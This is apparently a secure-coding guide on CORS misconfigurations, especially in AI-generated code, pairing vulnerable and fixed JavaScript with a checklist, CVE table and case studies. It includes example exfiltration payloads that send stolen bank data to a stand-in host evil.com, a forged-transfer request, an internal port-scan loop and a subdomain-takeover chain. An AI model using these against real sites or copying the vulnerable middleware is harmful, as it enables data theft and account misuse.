# CORS Deep Dive — Preflight Bypass, Null Origin, Credentials Mode, Wildcard vs Specific, Vibe Coding Misconfigs

**CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains), CWE-346 (Origin Validation Error)
**OWASP Top 10:2021:** A01 — Broken Access Control
**Related:** CWE-918 (SSRF), CWE-79 (XSS)

---

## What Is CORS?

Cross-Origin Resource Sharing (CORS) is a browser mechanism that **relaxes the Same-Origin Policy (SOP)** in a controlled way. SOP prevents a web page from one origin from reading resources from another origin. CORS allows servers to explicitly declare which origins are permitted to read their resources.

**The problem:** CORS is frequently misconfigured in ways that allow attackers to exfiltrate sensitive data. AI-generated code is particularly prone to permissive CORS settings because:

- AI uses `*` wildcard to "make things work"
- AI doesn't understand credentials mode implications
- AI reflects the `Origin` header without validation
- AI enables CORS "for development" and it ships to production

---

## Why Vibe Coding Makes This Worse

- **AI defaults to `Access-Control-Allow-Origin: *`** — "To allow all frontends to connect."
- **AI couples wildcard with `Access-Control-Allow-Credentials: true`** — Creates a CORS vulnerability that browsers explicitly block, but many bypass techniques exist.
- **AI reflects Origin headers** — Reads `Origin` from request and echoes it back without validation.
- **AI enables CORS methods/permissive** — Allows `PUT`, `DELETE`, `PATCH`, and custom headers on all routes.
- **AI doesn't handle preflight caching** — Sets `Access-Control-Max-Age` to days, making bypass persistent.
- **AI misuses `null` origin** — Whitelists `null` for local development but leaves it in production.

---

## CORS Headers Reference

| Header | Description | Direction |
|--------|-------------|-----------|
| `Access-Control-Allow-Origin` | Which origins are allowed | Response |
| `Access-Control-Allow-Credentials` | Whether credentials (cookies) can be sent | Response |
| `Access-Control-Allow-Methods` | Which HTTP methods are allowed (for preflight) | Response |
| `Access-Control-Allow-Headers` | Which headers can be used (for preflight) | Response |
| `Access-Control-Expose-Headers` | Which headers the browser can access | Response |
| `Access-Control-Max-Age` | How long to cache preflight result | Response |
| `Access-Control-Request-Method` | Which method will be used (preflight) | Request |
| `Access-Control-Request-Headers` | Which headers will be used (preflight) | Request |
| `Origin` | Where the request originated | Request |

---

## CORS Vulnerability Categories

### 1. Wildcard Origin with Credentials (Deadly Combo)

Setting `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is **physically impossible** per spec — browsers reject it. But there are many dangerous variants.

**Vulnerable Configuration:**
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
✅ Browsers block this. But the real danger is **reflected origin** + credentials.

**Dangerous — Reflected Origin with Credentials:**
```javascript
// 🔴 VULNERABLE: Echoing back any Origin header
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    next();
});
// Attack: Victim visits attacker's page, which makes authenticated request
// and exfiltrates the response
```

**Attack Demo:**
```javascript
// Malicious page at https://evil.com
fetch('https://bank.com/api/account', { credentials: 'include' })
    .then(r => r.text())
    .then(data => {
        fetch('https://evil.com/steal?data=' + encodeURIComponent(data));
    });
// If bank reflects Origin: https://evil.com in ACAO header, this works!
```

**Fixed — Specific Origin Validation:**
```javascript
// ✅ SAFE: Whitelist approach
const ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://admin.example.com'
];

app.use((req, res, next) => {
    const origin = req.headers.origin;
    if (ALLOWED_ORIGINS.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
    }
    next();
});
```

---

### 2. Preflight Bypass Techniques

The CORS preflight (OPTIONS request) is meant to check permissions before actual cross-origin requests. But several bypass techniques exist:

**Preflight for Simple Requests Only:**
CORS defines "simple requests" that skip preflight:
- GET, HEAD, POST only
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, or text/plain only
- No custom headers

```javascript
// 🔴 VULNERABLE: Sensitive API accepts 'text/plain' content type
app.post('/api/transfer', (req, res) => {
    const { amount, toAccount } = req.body;
    // Process transfer...
});

// The attacker sends:
fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'text/plain' }, // Simple request — NO PREFLIGHT
    body: JSON.stringify({ amount: 1000, toAccount: 'attacker' })
});
```

**Preflight Caching Abuse:**
```http
Access-Control-Max-Age: 86400  # Cache for 24 hours
```
If a subdomain is compromised, the long cache window means the browser won't re-check for 24 hours.

**Fixed — Never Rely on Preflight as Security:**
```javascript
// ✅ SAFE: Server-side authorization regardless of CORS
app.post('/api/transfer', authenticateUser, (req, res) => {
    const { amount, toAccount } = req.body;
    if (!req.session.csrfToken || req.headers['x-csrf-token'] !== req.session.csrfToken) {
        return res.status(403).send('CSRF validation failed');
    }
    // Server-side authorization checks
    if (!req.user.canTransfer(amount)) {
        return res.status(403).send('Insufficient permissions');
    }
    // Process transfer...
});
```

---

### 3. Null Origin Whitelisting

Browsers send `Origin: null` in several situations:
- `file://` protocol pages
- Sandboxed iframes (`sandbox=""` attribute)
- Data URIs (`data:text/html,...`)
- Cross-origin redirects
- Requests from `prerender` contexts

```javascript
// 🔴 VULNERABLE: Whitelisting null origin
const ALLOWED_ORIGINS = ['https://app.example.com', 'null'];
// null can be crafted using sandboxed iframe or data URI
```

**Exploit Using Sandboxed Iframe:**
```html
<!-- Attacker's page -->
<iframe sandbox="allow-scripts" src="data:text/html,<script>
  fetch('https://bank.com/api/account', { credentials:'include' })
    .then(r => r.text())
    .then(d => location='https://evil.com/?d='+encodeURIComponent(d))
</script>"></iframe>
```
When `Origin: null` is whitelisted with credentials, this sandboxed iframe can exfiltrate authenticated data.

**Fixed:**
```javascript
// ✅ SAFE: Never whitelist null
const ALLOWED_ORIGINS = ['https://app.example.com'];
// Remove 'null' from any origin whitelist
```

---

### 4. Origin Validation Bypass via Regex

Many implementations use weak validation that can be bypassed:

```javascript
// 🔴 VULNERABLE: Substring/suffix matching
function isAllowed(origin) {
    return origin.endsWith('example.com');
    // Bypass: https://example.com.evil.com  ✅
    // Bypass: https://evilexample.com  ✅
}

// 🔴 VULNERABLE: Regex without anchors
const ALLOWED = /https:\/\/.*\.example\.com/;
// Bypass: https://evil.com/?.example.com  ✅
// Bypass: https://evil.com#.example.com  ✅
```

**Secure Origin Validation:**
```javascript
// ✅ SAFE: Exact match against whitelist
const ALLOWED = new Set([
    'https://app.example.com',
    'https://admin.example.com',
    'https://api.example.com'
]);

function isValidOrigin(origin) {
    if (!origin) return false;
    try {
        const url = new URL(origin);
        // Only allow HTTPS
        if (url.protocol !== 'https:') return false;
        // No path/query — origins are scheme+host+port only
        return ALLOWED.has(url.origin);
    } catch {
        return false;
    }
}
```

---

### 5. Subdomain Takeover via CORS

A common pattern is allowing `*.example.com` as a trusted origin. If any subdomain is compromised or abandoned, it can be used to attack the main domain.

```javascript
// 🔴 VULNERABLE: Allow all subdomains
const ALLOWED_ORIGINS = /^https:\/\/[a-z0-9-]+\.example\.com$/;
// If old-subdomain.example.com is on a hosting service that can be claimed
// → Subdomain takeover → CORS bypass → Data theft
```

**Attack Chain:**
1. Discover `staging-2020.example.com` has a dangling CNAME to `heroku.com`
2. Register the Heroku app
3. Serve `https://staging-2020.example.com` with a page that fetches `https://app.example.com/api`
4. CORS validates the origin as a subdomain → Access Granted

**Fixed:**
```javascript
// ✅ SAFE: Explicit subdomain whitelist, not wildcard
const ALLOWED = new Set([
    'https://app.example.com',
    'https://dashboard.example.com',
    // Each subdomain listed explicitly
]);
```

---

### 6. Internal Network CORS Bypass

When internal applications use permissive CORS, external attackers can exploit them if the victim visits a malicious site while on the internal network:

```http
# 🔴 VULNERABLE: Internal app with permissive CORS
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true  # (browser would block, but...)
```

**Port Scanning via CORS:**
```javascript
// Attacker probes internal services using victim's browser
for (let port = 8000; port < 8010; port++) {
    fetch(`http://192.168.1.1:${port}/`, { mode: 'no-cors' })
        .then(() => console.log(`Port ${port} is open`))
        .catch(() => {});
}
```

---

## Vibe Coding CORS Misconfigs — Common Patterns

### Pattern 1: "CORS for Everyone" Middleware
```javascript
// 🔴 From ChatGPT: Permissive CORS for "easy development"
app.use(cors()); // Default: allows ALL origins! Never use in production

// 🔴 Another common AI output:
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');    // Wildcard
    res.header('Access-Control-Allow-Methods', '*');   // All methods
    res.header('Access-Control-Allow-Headers', '*');   // All headers
    next();
});
```

### Pattern 2: "Token in Query String" Workaround
```javascript
// 🔴 AI-generated workaround when CORS blocks custom headers
fetch(`/api/user?token=${localStorage.getItem('jwt')}`)
// Token in URL → leaks to server logs, browser history, referer header
```

### Pattern 3: CORS Proxy for "Debugging"
```javascript
// 🔴 AI suggests running a CORS proxy to "fix" frontend-backend issues
const corsProxy = require('cors-anywhere');
corsProxy.createServer().listen(8080);
// Removes all CORS protection — attackers love this
```

---

## Prevention Checklist

```
✅ CORS SECURITY CHECKLIST:
- Never use Access-Control-Allow-Origin: * in production
- Never reflect the Origin header without validation
- Use exact-match origin whitelisting (not regex, not suffix matching)
- Never whitelist 'null' in production
- Always require HTTPS origins (no http:// in production)
- Add Vary: Origin header when using dynamic ACAO
- Set specific Access-Control-Allow-Methods (GET, POST, etc.)
- Set specific Access-Control-Allow-Headers
- Keep Access-Control-Max-Age reasonable (10 min max)
- Do NOT rely on CORS for CSRF protection — use anti-CSRF tokens
- Implement server-side authorization — CORS is client-side only
- Never use Accept-All origins with credentials enabled
- Audit CORS headers regularly (use cors-test tool)
- For internal apps: still validate origins — don't trust network boundary
```

---

## Real-World CVEs & Incidents

| Vulnerability | CVE / Incident | Impact |
|---------------|---------------|--------|
| **Feast CORS Auth Bypass** | CVE-2024-11602 | Unauthenticated API access due to permissive CORS |
| **PayPal CORS Data Theft** | Bug bounty 2019 | Reflected origin with credentials → account data exfiltrated |
| **Shopify CORS + CSRF Combo** | Bug bounty 2020 | Wildcard CORS on admin API allowed unauthorized actions |
| **GitHub Enterprise CORS** | Bug bounty 2021 | Misconfigured CORS exposed internal API data |
| **Coinbase CORS Misconfig** | Bug bounty 2022 | Reflected origin on authenticated endpoints |
| **Zoom CORS + SSRF Chain** | Bug bounty 2020 | CORS misconfig amplified internal network scanning |
| **Flask-CORS Private Network** | CVE-2024-6221 | `Access-Control-Allow-Private-Network` set to `true` by default → private/internal network resources exposed to cross-origin requests |

### Case Study 1: PayPal CORS Data Exfiltration (2019)

A researcher discovered that PayPal's `paypal.com` reflected the `Origin` header in `Access-Control-Allow-Origin` on an authenticated API endpoint:

```
GET /myaccount/api/ HTTP/1.1
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

The researcher created a page that would:
1. Lure PayPal users to `evil.com`
2. The page would make authenticated fetch requests to PayPal's API
3. The browser would allow reading the response due to CORS
4. Exfiltrated account data to attacker's server

**Bounty:** $10,000+
**Source:** PortSwigger Research, bug bounty disclosure

### Case Study 2: CVE-2024-11602 — Feast CORS Vulnerability

A critical vulnerability in the Feast feature store platform allowed unauthenticated attackers to bypass CORS restrictions:

1. The server returned `Access-Control-Allow-Origin` with values that permitted attacker-controlled origins
2. Combined with permissive `Access-Control-Allow-Credentials`, this allowed cross-origin data theft
3. Attackers could exfiltrate sensitive feature store data through the victim's browser

**Source:** https://www.sentinelone.com/vulnerability-database/cve-2024-11602/

### Case Study 3: Internal Network CORS Scanning (PortSwigger Research)

PortSwigger Research demonstrated how CORS misconfigurations can be chained to scan internal networks. When internal tools (Jenkins, Grafana, Kibana) have permissive CORS, an attacker's website visited by an internal user can:

1. Scan open ports on `10.0.0.0/8` via CORS timing attacks
2. Access internal API endpoints (authenticated via the user's session cookies)
3. Exfiltrate internal tool data

**Source:** https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties

---

## Testing CORS

**Using curl:**
```bash
# Test wildcard
curl -H "Origin: https://evil.com" -I https://target.com/api

# Check response headers
curl -H "Origin: null" -I https://target.com/api

# Test with credentials
curl -H "Origin: https://evil.com" -H "Cookie: session=abc" -I https://target.com/api
```

**Using browser console:**
```javascript
// Test if CORS allows your origin
fetch('https://target.com/api/data', {
    credentials: 'include',
    headers: { 'X-Custom': 'test' }
}).then(r => r.text()).then(console.log).catch(console.log);
```

**Tools:**
- [CORS Test](https://webbrowsertools.com/cors-test/) — Online CORS checker
- Burp Suite — Active/passive CORS scanning
- corsy — CORS misconfiguration scanner (Python)
- [cors-test](https://www.npmjs.com/package/cors-test) — Node.js CORS testing tool

---

## References

- [OWASP CORS Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [PortSwigger CORS Vulnerabilities](https://portswigger.net/web-security/cors)
- [MDN CORS Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html)
- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
- [PortSwigger Research: Exploiting CORS Misconfigurations](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [Fetch Standard — CORS Protocol](https://fetch.spec.whatwg.org/#http-cors-protocol)
